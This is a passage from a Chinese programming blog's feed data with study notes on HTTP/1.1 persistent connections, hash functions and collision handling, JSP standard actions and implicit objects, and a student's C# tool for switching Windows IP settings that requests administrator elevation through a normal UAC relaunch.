title="7.2、HTTP&#x2F;1.1的persistent连接"></a>7.2、HTTP&#x2F;1.1的persistent连接</h3><ul><li><p>HTTP&#x2F;1.1逐渐停止了对keep-alive连接的支持，用persistent连接替代了它，与keep-alive连接不同，HTTP&#x2F;1.1中persistent连接默认就是激活的，除非特别指明，否则HTTP&#x2F;1.1认为所有连接都是持久的。</p></li><li><p>HTTP&#x2F;1.1的客户端假定在收到的响应后，除非报文包含了Connection: Close首部，否则客户端就认为连接仍为维持在打开状态。如果客户端要建立一个非持久连接，则需要在请求中包含Connection: Close首部；服务器在处理完该事务后，就会在响应中包含Connection: Close首部以告知客户端连接已关闭。如果客户端不想在一条persistent连接上发送更多请求了，就应该在最后一条请求中包含Connection: Close首部。</p></li><li><p>只要服务器决定在事务处理结束后关闭连接，就必须在响应中包含Connection: Close首部。但不发送Connection: Close首部也并不意味着服务器承诺永远将连接保持在打开状态。同样地，不管连接是否维持在打开状态，或Connection首部取了什么值，客户端和服务器仍然可以随时关闭空闲连接。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash表数据分布及冲突解决方法</title>
      <link href="/2017/03/01/hash/"/>
      <url>/2017/03/01/hash/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Hash表基本概念"><a href="#一、Hash表基本概念" class="headerlink" title="一、Hash表基本概念"></a>一、Hash表基本概念</h2><h3 id="1-1、装填因子"><a href="#1-1、装填因子" class="headerlink" title="1.1、装填因子"></a>1.1、装填因子</h3><p>装填因子 &#x3D; （哈希表中的记录数） &#x2F;  （哈希表的长度）</p><p>装填因子是哈希表装满程度的标记因子。值越大，填入表中的数据元素越多，产生冲突的可能性越大。</p><h2 id="二、Hash函数"><a href="#二、Hash函数" class="headerlink" title="二、Hash函数"></a>二、Hash函数</h2><h3 id="2-1、直接寻址法"><a href="#2-1、直接寻址法" class="headerlink" title="2.1、直接寻址法"></a>2.1、直接寻址法</h3><p>将某个关键字或者关键字的某个线性函数值作为哈希地址，即<code>Func(Key)=a*Key+b</code>，其中a和b为整数；这种散列函数也叫做自身函数，如果<code>Func(Key)</code>的哈希地址上已经有值了，那么就往下一个位置找，直到找到<code>Func(Key)</code>的位置没有值了就把元素放进去。</p><h3 id="2-2、数字分析法"><a href="#2-2、数字分析法" class="headerlink" title="2.2、数字分析法"></a>2.2、数字分析法</h3><p>分析要写入的数据，依据数据的特性，选择数字出现冲突率较低的部分列来构造哈希地址，因此数字分析法就是找出数字的规律，尽可能利用这些数据来构造冲突几率较低的散列地址。</p><h3 id="2-3、平方取中法"><a href="#2-3、平方取中法" class="headerlink" title="2.3、平方取中法"></a>2.3、平方取中法</h3><p>取一个数平方后的中间几位作为散列地址，一个数的平方值的中间几位和数的每一位都有关。因此，利用平方取中法得到的哈希地址同数字的每一位都有关，这样的哈希地址具有较好的分散性。该方法适用于关键字中的每一位取值都不够分散或者较分散的位数小于哈希地址所需要的位数的情况。</p><h3 id="2-4、折叠法"><a href="#2-4、折叠法" class="headerlink" title="2.4、折叠法"></a>2.4、折叠法</h3><p>折叠法即将关键字分割成位数相同的几部分，最后一部分位数可以不同，然后取这几部分的叠加和（注意：叠加和时去除进位）作为散列地址，数位叠加可以有<code>移位叠加</code>和<code>间界叠加</code>两种方法：</p><ul><li><code>移位叠加</code>：将分割后的每一部分的最低位对齐，然后相加;</li><li><code>间界叠加</code>：从一端向另一端沿分割界来回折叠，然后对齐相加；</li></ul><h3 id="2-5、随机数法"><a href="#2-5、随机数法" class="headerlink" title="2.5、随机数法"></a>2.5、随机数法</h3><p>选择一个随机数，去关键字的随机值作为散列地址，通常用于关键字长度不同的场合。</p><h3 id="2-6、取余数法（比较常用）"><a href="#2-6、取余数法（比较常用）" class="headerlink" title="2.6、取余数法（比较常用）"></a>2.6、取余数法（比较常用）</h3><p>取关键字被某个不大于散列表长度的基数p，除后所得的余数为散列地址，即<code>Func(Key)=Key MOD p</code>，其中<code>p&lt;=m</code>。不仅可以对关键字直接取模，也可在折叠、平方取中等运算之后取模。对<code>p</code>的选择很重要，一般取<code>素数</code>，若<code>p</code>选得不好，则很容易产生冲突，一般<code>p</code>取值为哈希表的长度。</p><h2 id="三、Hash冲突解决方法"><a href="#三、Hash冲突解决方法" class="headerlink" title="三、Hash冲突解决方法"></a>三、Hash冲突解决方法</h2><h3 id="3-1、开放定址法（线性探测法）"><a href="#3-1、开放定址法（线性探测法）" class="headerlink" title="3.1、开放定址法（线性探测法）"></a>3.1、开放定址法（线性探测法）</h3><p>线性探测法的地址增量<code>di = 1, 2, ... , m-1</code>，其中<code>i</code>为探测次数。该方法一次探测一个地址（上次探测的下一个地址），直到有空的地址后插入，若整个空间都找不到空余的地址，则产生溢出。</p><p>线性探测容易产生<code>聚集现象</code>，当表中的第<code>i</code>、<code>i+1</code>、<code>i+2</code>的位置上已经存储某些关键字，则下一次哈希地址为<code>i</code>、<code>i+1</code>、<code>i+2</code>、<code>i+3</code>的关键字都将企图填入到<code>i+3</code>的位置上，这种多个哈希地址不同的关键字争夺同一个后继哈希地址的现象称为<code>聚集</code>。聚集对查找效率有很大影响。</p><h3 id="3-2、链地址法（拉链法）"><a href="#3-2、链地址法（拉链法）" class="headerlink" title="3.2、链地址法（拉链法）"></a>3.2、链地址法（拉链法）</h3><p>将所有具有相同哈希地址的而不同关键字的数据元素连接到同一个单链表中。如果选定的哈希表长度为<code>m</code>，则可将哈希表定义为一个有<code>m</code>个头指针组成的指针数组<code>T[0..m-1]</code>，凡是哈希地址为<code>i</code>的数据元素，均以节点的形式插入到<code>T[i]</code>为头指针的单链表中。并且新的元素插入到链表的前端（通常新插入的元素可能不久又会被访问）。</p><p><strong>特点：</strong></p><ul><li>处理冲突简单，且无堆积现象，即非同义词决不会发生冲突，因此平均查找长度较短；</li><li>由于各链表上的节点空间是动态申请的，因此它更适合于造表前无法确定表长的情况； </li><li>开放定址法为减少冲突，要求装填因子<code>α</code>较小，故当结点规模较大时会浪费很多空间，而拉链法中可取<code>α≥1</code>，且结点较大时，拉链法中增加的指针域可忽略不计，因此节省空间； </li><li>删除结点的操作易于实现，只要简单地删去链表上相应的结点即可。对于使用开放定址法构造的散列表，删除结点不能简单地将被删节点的空间置为空，否则将截断在它之后填入哈希表的同义词节点的查找路径。这是因为在开放定址法中，空地址单元(即开放地址)都是查找失败的条件。因此在用开放定址法处理冲突的散列表上执行删除操作，只能在被删结点上做删除标记，而不能真正删除结点。</li></ul><h3 id="3-3、再哈希法（二次哈希法）"><a href="#3-3、再哈希法（二次哈希法）" class="headerlink" title="3.3、再哈希法（二次哈希法）"></a>3.3、再哈希法（二次哈希法）</h3><p>同时构造多个不同的哈希函数： <code>Func1 = RH1(key)</code>  ， <code>Func2 = RH2(key)</code> ，当<code>Func1 = RH1(key)</code>  发生冲突时，再用<code>Func2 = RH2(key)</code> 进行计算，直到冲突不再产生，这种方法不易产生聚集，但是增加了计算时间。</p><h2 id="四、平均查找长度计算"><a href="#四、平均查找长度计算" class="headerlink" title="四、平均查找长度计算"></a>四、平均查找长度计算</h2><h3 id="4-1、公式"><a href="#4-1、公式" class="headerlink" title="4.1、公式"></a>4.1、公式</h3><table><thead><tr><th align="center">处理冲突的方法</th><th align="center">平均查找长度【查找成功】</th><th align="center">平均查找长度【查找失败】</th></tr></thead><tbody><tr><td align="center">线性探测法</td><td align="center">$S_(nl) \approx \frac{1}{2}(1+\frac{1}{1-\alpha})$</td><td align="center">$U_(nl) \approx \frac{1}{2}(1+\frac{1} {(1-\alpha)^2})$</td></tr><tr><td align="center">二次探测法和双哈希法</td><td align="center">$S_(nr) \approx-\frac{1}{\alpha}\ln(1-\alpha)$</td><td align="center">$U_(nr) \approx \frac{1}{1-\alpha}$</td></tr><tr><td align="center">链地址法</td><td align="center">$S_(nc) \approx 1+\frac{\alpha}{2}$</td><td align="center">$U_(nc) \approx \alpha + e^{-\alpha} $</td></tr></tbody></table><h3 id="4-2、示例"><a href="#4-2、示例" class="headerlink" title="4.2、示例"></a>4.2、示例</h3><p>假设散列表的长度是<code>13</code>，散列函数为<code>H(K) = k % 13</code>，给定的关键字序列为<code>&#123;32， 14， 23， 01， 42， 20， 45， 27， 55， 24， 10， 53&#125;</code>。分别画出用线性探测法和拉链法解决冲突时构造的哈希表，并求出在等概率情况下，这两种方法的查找成功和查找不成功的平均查找长度。</p><h4 id="4-2-1、线性探测法"><a href="#4-2-1、线性探测法" class="headerlink" title="4.2.1、线性探测法"></a>4.2.1、线性探测法</h4><p><img src="https://cdn.bugwz.com/hash-linear-detection.png" alt="线性探测法计算"></p><h4 id="4-2-2、链地址法"><a href="#4-2-2、链地址法" class="headerlink" title="4.2.2、链地址法"></a>4.2.2、链地址法</h4><p><img src="https://cdn.bugwz.com/hash-chain-address.png" alt="链地址法计算"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用C#编写的一个IP地址修改器</title>
      <link href="/2017/01/05/ip-address-modifier/"/>
      <url>/2017/01/05/ip-address-modifier/</url>
      
        <content type="html"><![CDATA[<h2 id="一、编写初衷："><a href="#一、编写初衷：" class="headerlink" title="一、编写初衷："></a>一、编写初衷：</h2><p>在学校的时候很多时候需要更改自己电脑的IP地址，比如机房课程设计的时候，拔掉机房的网线插到自己电脑上的时候，每次都得配上机房的IP地址，下午下课回去后还得自己更改为自动获取IP地址，很是烦人。之后我曾经用过BAT的方式去修改电脑的IP地址等信息，之前用起来效果也十分不错，但是毕竟添加IP地址等信息还得去编辑BAT，也不是十分方便，对于一些小白用户来说多少也是个麻烦事，并且之前的那个BAT需要手动以管理员方式运行，也比较麻烦，为此打算用C#写一个小程序，方便的来改变电脑的IP地址等信息。</p><h2 id="二、软件详细介绍："><a href="#二、软件详细介绍：" class="headerlink" title="二、软件详细介绍："></a>二、软件详细介绍：</h2><p>该IPAddressModifier软件使用Microsoft Visual Studio 2015这款IDE使用C#进行编写，整体上只设计了两个窗体，一个是当前网络适配器详情以及预览预设置IP地址等信息的窗体，还有一个是针对预选IP地址等信息的操作窗体，整体的耗时大概一周左右，其实时间应该是两周左右，因为中间有一些考试，我还需要好好复习一下，所以一共做的时间应该是一周左右，因为本人C#的技能并不是很好，也想把这次当作C#的一次复习，所以就是边查边做了。开始进入界面，并详细介绍。</p><h3 id="2-1、第一个窗体截图如下："><a href="#2-1、第一个窗体截图如下：" class="headerlink" title="2.1、第一个窗体截图如下："></a>2.1、第一个窗体截图如下：</h3><p><img src="https://cdn.bugwz.com/006qpCDTgw1fbfwky13tnj30970ck0t3.jpg" alt="Main Interface"></p><p>打开这个窗体的时候需要使用管理员权限打开，打开时会有该软件需要管理员权限等的提示，然后就针对“管理员权限”这一点详细说明一下；之前我是在<code>app.manifest</code>中修改后的如下代码启用管理员权限：</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&lt;requestedExecutionLevel  level=<span class="string">&quot;requireAdministrator&quot;</span> uiAccess=<span class="string">&quot;false&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>因为我当初的想法是将这个软件打包发行，但是后来出现的问题是VS无法在这种情况下打包，总是出现类似于“ClickOnce”之类的错误，我尝试按照网络上一些人的建议进行修改，最后仍然会出现这种错误，最后使用在<code>Program.cs</code>文件中的设置修改如下代码完成管理员权限的赋予：</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//Application.EnableVisualStyles();</span></span><br><span class="line">            <span class="comment">//Application.SetCompatibleTextRenderingDefault(false);</span></span><br><span class="line">            <span class="comment">//Application.Run(new IPAddressModifier());</span></span><br><span class="line">            Application.EnableVisualStyles();</span><br><span class="line">            Application.SetCompatibleTextRenderingDefault(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 当前用户是管理员的时候，直接启动应用程序</span></span><br><span class="line"><span class="comment">             * 如果不是管理员，则使用启动对象启动程序，以确保使用管理员身份运行</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="comment">//获得当前登录的Windows用户标示</span></span><br><span class="line">            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();</span><br><span class="line">            System.Security.Principal.WindowsPrincipal principal = <span class="keyword">new</span> System.Security.Principal.WindowsPrincipal(identity);</span><br><span class="line">            <span class="comment">//判断当前登录用户是否为管理员</span></span><br><span class="line">            <span class="keyword">if</span> (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果是管理员，则直接运行</span></span><br><span class="line">                Application.Run(<span class="keyword">new</span> IPAddressModifier());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//创建启动对象</span></span><br><span class="line">                System.Diagnostics.ProcessStartInfo startInfo = <span class="keyword">new</span> System.Diagnostics.ProcessStartInfo();</span><br><span class="line">                startInfo.UseShellExecute = <span class="literal">true</span>;</span><br><span class="line">                startInfo.WorkingDirectory = Environment.CurrentDirectory;</span><br><span class="line">                startInfo.FileName = Application.ExecutablePath;</span><br><span class="line">                <span class="comment">//设置启动动作,确保以管理员身份运行</span></span><br><span class="line">                startInfo.Verb = <span class="string">&quot;runas&quot;</span>;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    System.Diagnostics.Process.Start(startInfo);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//退出</span></span><br><span class="line">                Application.Exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="2-2、第二个窗体截图如下："><a href="#2-2、第二个窗体截图如下：" class="headerlink" title="2.2、第二个窗体截图如下："></a>2.2、第二个窗体截图如下：</h3><p><img src="https://cdn.bugwz.com/006qpCDTjw1fbfw62ys31j309k0akt8z.jpg" alt="IP Info Interface"></p><p>这个窗体中主要就是对于网络适配器的预选信息进行增加删除修改操作，需要说明的是，这些信息全部存放在本机的<code>C:\Windows\IPInfo.txt</code>中，也可以自己手动去更改其中的信息，这其中的知识点就是C#对于文件的读写操作。</p><p>需要说的一点是，在这个窗体中所做的修改会同时同步到第一个窗体中的下面的网络适配器目标信息的combox中，这里使用的方法如下：</p><p>第一个窗体中的代码如下：（重点代码以作注释标注）</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> IPAddressModifier ipWindow = <span class="literal">null</span>;<span class="comment">//重点</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">IPAddressModifier</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">            ipWindow = <span class="keyword">this</span>;<span class="comment">//重点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span>[,] adapterinfo=<span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">20</span>,<span class="number">10</span>];<span class="comment">//存放网卡信息的二维数组</span></span><br><span class="line">        <span class="built_in">string</span>[,] toadapterinfo = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">20</span>, <span class="number">10</span>];<span class="comment">//存放目标网卡信息的二维数组</span></span><br><span class="line">        <span class="built_in">int</span> adapter_i=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">string</span> adapterid=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> path= <span class="string">&quot;C:\\Windows\\IPInfo.txt&quot;</span>;<span class="comment">//存放ip信息的路径</span></span><br><span class="line">        adapterFile adapterF;</span><br><span class="line">        <span class="comment">//adapterFile窗体通过此方法更新adapterInfoToText的combox的items      [重点方法]</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update_adapterInfoToText</span>(<span class="params"><span class="built_in">int</span> i,<span class="built_in">int</span> j,<span class="built_in">int</span> inum,<span class="built_in">string</span> str</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//MessageBox.Show(i.ToString()+&quot;dadad&quot;);</span></span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; j==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                adapterInfoToText.Items.Clear();<span class="comment">//先清空，添加items之前必须清空一次</span></span><br><span class="line">                adapterInfoToText.Items.Add(toadapterinfo[<span class="number">0</span>, <span class="number">0</span>]);</span><br><span class="line">                toadapterinfo[i + <span class="number">1</span>, <span class="number">0</span>] = str;</span><br><span class="line">                adapterInfoToText.Items.Add(toadapterinfo[i + <span class="number">1</span>, <span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                toadapterinfo[i + <span class="number">1</span>, j] = str;</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    adapterInfoToText.Items.Add(toadapterinfo[i + <span class="number">1</span>, <span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == inum<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                adapterListText.SelectedIndex = <span class="number">0</span>;</span><br><span class="line">                adapterInfoToText.SelectedIndex = <span class="number">0</span>;</span><br><span class="line">                changeColor(<span class="string">&quot;black&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> n = <span class="number">0</span>; n &lt; <span class="number">7</span>; n++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        changeText(n, adapterinfo[<span class="number">0</span>, n]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>第二个窗体中的调用代码如下：</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">IPAddressModifier.ipWindow.update_adapterInfoToText(i, j, ipnum, adapter_info[i, j].ToString());</span><br></pre></td></tr></table></figure><h1 id="结束语："><a href="#结束语：" class="headerlink" title="结束语："></a>结束语：</h1><p>其实最初的想法并没有那么复杂，只是想写一个软件来修改IP地址等信息就好了，但是出于本人的有点强迫症，这个坑感觉越挖越有点大，截止到目前为止，其实还有好多坑没填上，比如挖坑的时候还想要这个软件能够获取出所有禁用的和启用的网卡，但是目前为止只能获取到已经启用的网卡；当初还想要可以对网卡进行禁用或启用操作，现在也还没实现，但是说实话我感觉现在已经弄得很不错了，代码我已经放在<a href="https://github.com/CUBEGWZ/IPAddressModifier">GitHub</a> 上了，希望大家能够多提意见，改进一下这款软件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Notions </tag>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP标准动作-JSP笔记-7</title>
      <link href="/2016/12/14/jsp-7/"/>
      <url>/2016/12/14/jsp-7/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><h3 id="1-1、JavaBean的含义："><a href="#1-1、JavaBean的含义：" class="headerlink" title="1.1、JavaBean的含义："></a>1.1、JavaBean的含义：</h3><ul><li><p>JavaBean是一种java语言写成的可复用组件。</p></li><li><p>它是一种特殊的java类，特殊性如下：</p><ul><li>类必须是具体的和公共的；</li><li>具有无参数的构造方法；</li><li>勒种方法的访问属性必须是public的，并且方法的命名也必须遵守一定的命名规范。</li></ul></li></ul><h3 id="1-2、JavaBean的优点："><a href="#1-2、JavaBean的优点：" class="headerlink" title="1.2、JavaBean的优点："></a>1.2、JavaBean的优点：</h3><ul><li><p>提高代码的可复用性；</p></li><li><p>程序易于开发维护；</p></li><li><p>可以跨平台；</p></li></ul><h3 id="1-3、JavaBean的使用："><a href="#1-3、JavaBean的使用：" class="headerlink" title="1.3、JavaBean的使用："></a>1.3、JavaBean的使用：</h3><ul><li>标准动作用于：<ul><li>将JavaBean嵌入JSP页面；</li><li>设置和获取JavaBean的属性</li><li>将用户请求转发给其他页面</li><li>将其他用户的内容嵌入当前页面</li></ul></li><li>标准动作中的属性区分大小写。</li><li>JSP中的标准动作使用<jsp>作为前缀。</li><li>JSP可使用JSP标准动作调用JavaBean组件并访问属性。</li></ul><h1 id="Java标准动作包括："><a href="#Java标准动作包括：" class="headerlink" title="Java标准动作包括："></a>Java标准动作包括：</h1><ol><li><code>&lt;jsp:useBean&gt;</code></li><li><code>&lt;jsp:setProperty&gt;</code></li><li><code>&lt;jsp:getProperty&gt;</code></li><li><code>&lt;jsp:forward&gt;</code></li><li><code>&lt;jsp:include&gt;</code></li></ol><h2 id="useBean动作："><a href="#useBean动作：" class="headerlink" title="useBean动作："></a>useBean动作：</h2><ol><li><a href="jsp:useBean">jsp:useBean</a>标签用于在指定的域范围内查找指定名称的JavaBean对象：</li></ol><ul><li>如果存在则直接返回该JavaBean对象的引用；</li><li>如果不存在则实例化一个新的JavaBean对象并将它以制定的名称存储到指定的与范围内。</li></ul><ol start="2"><li><p>常用语法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:useBean id=<span class="string">&quot;beanName&quot;</span> class=<span class="string">&quot;package.class&quot;</span> scope=<span class="string">&quot;page|request|session|application&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//id属性用于指定JavaBean实话对象的引用名称和气存储在域范围中的名称。</span></span><br><span class="line"><span class="comment">//class属性用于指定JavaBean的完整类名(即必须带有包名)。</span></span><br><span class="line"><span class="comment">//scope属性用于指定JavaBean实例对象所存储的域范围，其值只能是page、request、session和application等四个值中的一个，其默认值是page。</span></span><br></pre></td></tr></table></figure><p>关于<code>scope</code>属性中的域范围的描述如下：</p></li><li><p>Page – Bean只能自啊使用页面时使用(仅涵盖使用JavaBean的页面)。当加载新页面，就会将其销毁(pageBean.jsp&#x2F;MyBean.java)</p></li><li><p>Request – 有效范围仅限于使用JavaBean的请求(requestBean.jsp&#x2F;MyBean.java)</p></li><li><p>Session – 有效范围在用户整个连接过程中(整个会话过程均有效)(sessionBean.jsp&#x2F;MyBean.java)</p></li><li><p>Application – 有效范围涵盖整个应用程序。也就是对整个网站均有效。(applicationBean1.jsp applicationBean2.jsp&#x2F;MyBean.java)</p></li></ol><p>##补充：Get()和Set()方法：<br>Get()和Set()方法用于访问JavaBean的属性</p><ol><li>Get()方法：定义了共有方法，Get()方法返回值；</li><li>Set()方法：定义了共有方法，Set()方法给属性赋值；</li></ol><h2 id="setProperty动作："><a href="#setProperty动作：" class="headerlink" title="setProperty动作："></a>setProperty动作：</h2><ol><li><a href="jsp:setProperty">jsp:setProperty</a>标签用于设置JavaBean对象的属性。</li><li>语法结构如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:setProperty name=<span class="string">&quot;beanName&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">property=<span class="string">&quot;propertyName&quot;</span> value=<span class="string">&quot;&#123;string | &lt;%= expression %&gt;&#125;&quot;</span> | property=<span class="string">&quot;propertyName&quot;</span> [param=<span class="string">&quot;parameterName&quot;</span>] | property=<span class="string">&quot;*&quot;</span></span><br><span class="line">&#125;/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//name 属性用于指定JavaBean对象的名称。</span></span><br><span class="line"><span class="comment">//property 属性用于指定JavaBean实例对象的属性名</span></span><br><span class="line"><span class="comment">//value 属性用于指定JavaBean对象的某个属性的值，value的值可以是字符串，也可以是表达式。为字符串时，该值会自动转化为JavaBean属性相应的类型，如果value的值是一个表达式，那么该表达式的计算结果必须与所要设置的JavaBean属性的类型一致。</span></span><br><span class="line"><span class="comment">//param属性用于将JavaBean实例对象的某个属性值设置为一个请求参数值，该属性值同样会自动转换成要设置的JavaBean属性的类型。</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="getProperty动作："><a href="#getProperty动作：" class="headerlink" title="getProperty动作："></a>getProperty动作：</h2><ol><li><a href="jsp:getProperty">jsp:getProperty</a>标签用于读取JavaBean对象的属性，也就是调用JavaBean对象的getter方法，然后将读取的属性值转换成字符串后插入进输出的响应正文中。</li><li>语法格式为：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:getProperty name=<span class="string">&quot;beanInstanceName&quot;</span> property=<span class="string">&quot;PropertyName&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//name 属性用于指定JavaBean实例对象的名称，其值应该与&lt;jsp:useBean&gt;标签的id属性值相同。</span></span><br><span class="line"><span class="comment">//property属性用于指定JavaBean实力对象的属性名。</span></span><br></pre></td></tr></table></figure></li><li>如果一个JavaBean实例对象的某个属性的值为null，那么，使用<code>&lt;jsp:getProperty&gt;</code>标签输出该属性的结果将是一个内容为”null”的字符串。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP隐式对象-JSP笔记-6</title>
      <link href="/2016/12/11/jsp-6/"/>
      <url>/2016/12/11/jsp-6/</url>
      
        <content type="html"><![CDATA[<h2 id="一、关于JSP隐式对象"><a href="#一、关于JSP隐式对象" class="headerlink" title="一、关于JSP隐式对象"></a>一、关于JSP隐式对象</h2><ul><li><p>JSP饮食对象是web容器加载的一组类的实例。</p></li><li><p>它不像一般的java对象那样用”new”去获取实例，而是可以直接在jsp页面的java程序片和表达式部分使用对象。</p></li><li><p>jsp使用java定义的隐式对象来访问网页的动态内容。</p></li><li><p>隐式对象的名称是jsp的保留字。</p></li><li><p>jsp提供了一些隐式对象可简化开发。</p></li></ul><blockquote><p>注：这里我们主要体验这些JSP隐式对象的作用范围。</p></blockquote><ol><li>对象的作用域是可以访问对象的部分；</li><li>JSP页面中的隐式对象的作用域包括：</li></ol><ul><li>page – 再引用对象的JSP页面中提供对象。</li><li>Request – 提供在所有请求页面中可用的对象。</li><li>Session – 提供对象已访问给顶应用程序中的所有网页。例如，用户访问一个网站，并通过访问其他链接打开网站中的其他页面。网站中的所有网页形成一个应用程序作用域。</li></ul><ol start="3"><li>作用于通信对象和控制对象用于访问给定作用域中可用的所有对象。</li></ol><h2 id="二、四种隐式对象："><a href="#二、四种隐式对象：" class="headerlink" title="二、四种隐式对象："></a>二、四种隐式对象：</h2><ol><li>输入&#x2F;输出对象：</li></ol><ul><li>request</li><li>response</li><li>out</li></ul><ol start="2"><li>作用域通信对象：</li></ol><ul><li>session</li><li>application</li><li>pageContext</li></ul><ol start="3"><li>Servlet对象</li></ol><ul><li>page</li><li>config</li></ul><ol start="4"><li>错误对象</li></ol><ul><li>exception</li></ul><h3 id="2-1、输入-x2F-输出对象："><a href="#2-1、输入-x2F-输出对象：" class="headerlink" title="2.1、输入&#x2F;输出对象："></a>2.1、输入&#x2F;输出对象：</h3><ol><li>控制页面的输入和输出</li><li>访问与所有请求和响应有关的数据</li><li>输入和输出对象包括request，response和out</li></ol><h3 id="2-2、request对象"><a href="#2-2、request对象" class="headerlink" title="2.2、request对象"></a>2.2、request对象</h3><p>客户端请求，此请求会包含来自GET&#x2F;POST请求的参数；用户输入的数据用来保存在Request对象中，用javax.servlet.HttpServlet来执行。<code>request对象的作用范围只在本页</code>，跳转页面后之前的设置信息失效。部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">request.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zhangsan&quot;</span>) ;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>) ;</span><br><span class="line">    <span class="comment">//request.removeAttribute(&quot;name&quot;);</span></span><br><span class="line">    %&gt;</span><br><span class="line">    &lt;jsp:forward page=<span class="string">&quot;request1.jsp&quot;</span>/&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;&lt;%=path %&gt;/first/request1.jsp&quot;</span>&gt;request1.jsp&lt;/a&gt;</span><br><span class="line">  &lt;/body&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3、response对象"><a href="#2-3、response对象" class="headerlink" title="2.3、response对象"></a>2.3、response对象</h3><p>处理jsp生成的响应；响发送给客户端；实现javax.servlet.http.HttpServletResponse接口；jsp引擎吧存放在request对象中的数据发到服务器端的组件，组件收到这些个数据后进行相应处理；返回一个response对象给jsp引擎，jsp引擎再把response对象传给jsp页面，这时的页面包含了定好的格式和从服务器端得到的数据。<code>response的作用范围仍然局限于本页面</code>。</p><h3 id="2-4、out对象"><a href="#2-4、out对象" class="headerlink" title="2.4、out对象"></a>2.4、out对象</h3><p>表示输出流(注意不是response.getWriter(),因为这种是PrintWriter类型)；javax.servlet.jsp.JspWriter类的实例；使用write()、print()、和println()方法；Write()和print()方法的区别是<code>Write只能输出和字符相关的东西，而print()可以输出各种那个数据类型</code>。</p><h2 id="三、作用域通信对象"><a href="#三、作用域通信对象" class="headerlink" title="三、作用域通信对象"></a>三、作用域通信对象</h2><h3 id="3-1、session对象"><a 